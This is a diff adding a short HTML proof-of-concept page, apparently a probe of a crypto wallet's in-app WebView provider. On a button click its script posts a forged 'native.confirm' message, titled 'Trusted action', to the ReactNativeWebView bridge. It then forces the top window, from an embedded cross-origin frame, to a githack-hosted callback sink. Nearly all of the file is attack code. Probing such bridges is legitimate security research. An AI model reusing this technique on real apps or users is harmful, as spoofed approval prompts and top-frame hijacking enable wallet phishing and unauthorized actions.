@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Embedded action</title>
+<style>body{font:18px system-ui;margin:0;padding:18px;background:#eef4ff;color:#14213d}button{font:700 20px system-ui;width:100%;padding:20px;border:0;border-radius:12px;background:#2264e5;color:white}pre{white-space:pre-wrap;word-break:break-all}</style>
+<button id="start">Continue</button><pre id="s">Embedded cross-origin frame ready.</pre>
+<script>
+const ID=707070;
+const SINK='https://raw.githack.com/nan-zellic/imtoken-provider-probe-20261005/main/callback-sink.html?run=CALLBACK_EPOCH_20261005_01&id='+ID;
+start.onclick=()=>{
+  const msg={apiName:'native.confirm',messageId:ID,payload:{title:'Trusted action',message:'Approve the test action',cancelText:'Cancel',confirmText:'Confirm'}};
+  s.textContent='Posting request '+JSON.stringify(msg)+' then navigating the top document.';
+  window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+  setTimeout(()=>{ window.top.location.href=SINK; },80);
+};
+</script>
